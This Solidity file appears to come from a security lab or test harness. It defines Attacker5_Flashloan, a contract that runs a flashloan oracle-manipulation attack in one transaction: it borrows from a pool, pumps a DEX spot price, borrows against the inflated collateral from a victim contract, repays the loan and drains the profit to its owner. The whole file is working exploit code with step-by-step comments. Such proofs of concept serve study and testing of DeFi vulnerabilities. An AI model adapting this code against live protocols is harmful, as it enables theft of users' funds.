// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./FlashloanContracts.sol";

/**
 * Attacker5_Flashloan
 * Flashloan + price manipulation + extraction attack.
 *
 * Steps (all in one transaction):
 * 1. Borrow flashloan from FlashloanPool
 * 2. Dump borrowed ETH into SimpleDex → manipulate spot price upward
 * 3. Call FlashloanVictim.borrowAgainstCollateral() at inflated price → receive ETH
 * 4. Repay flashloan + fee from borrowed ETH
 * 5. Keep the profit (borrowed ETH - repayment)
 */
contract Attacker5_Flashloan {
    FlashloanPool public pool;
    SimpleDex public dex;
    FlashloanVictim public victim;
    address public owner;
    uint256 public flashAmount;

    constructor(address _pool, address _dex, address _victim) {
        pool = FlashloanPool(payable(_pool));
        dex = SimpleDex(payable(_dex));
        victim = FlashloanVictim(payable(_victim));
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 0.1 ether, "need collateral ETH");
        // Collateral is already deposited by the runner before calling attack()
        // Borrow 50% of pool (conservative — ensures repayment works)
        flashAmount = address(pool).balance / 2;
        require(flashAmount > 0, "pool empty");
        pool.flashloan(flashAmount);
    }

    // Called by FlashloanPool during flashloan — must repay before returning
    function executeFlashloan(uint256 amount) external payable {
        require(msg.sender == address(pool), "only pool");

        // Step 2: Manipulate DEX price — swap 60% of borrowed ETH into DEX
        // This inflates the ETH/token price significantly
        uint256 swapAmount = amount * 60 / 100;
        dex.swapEthForTokens{value: swapAmount}();

        // Step 3: Borrow against inflated collateral price
        // The victim reads DEX spot price which is now much higher
        // This sends ETH back to this contract
        victim.borrowAgainstCollateral();

        // Step 4: Repay flashloan + 0.1% fee
        uint256 fee = amount / 1000;
        uint256 repay = amount + fee;
        // We have: (amount - swapAmount) + borrowedFromVictim
        // As long as victim sends us enough, we can repay
        require(address(this).balance >= repay, "insufficient to repay flashloan");
        (bool ok, ) = address(pool).call{value: repay}("");
        require(ok, "repay failed");
        // Step 5: Profit stays in this contract (drained via drain())
    }

    function drain() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
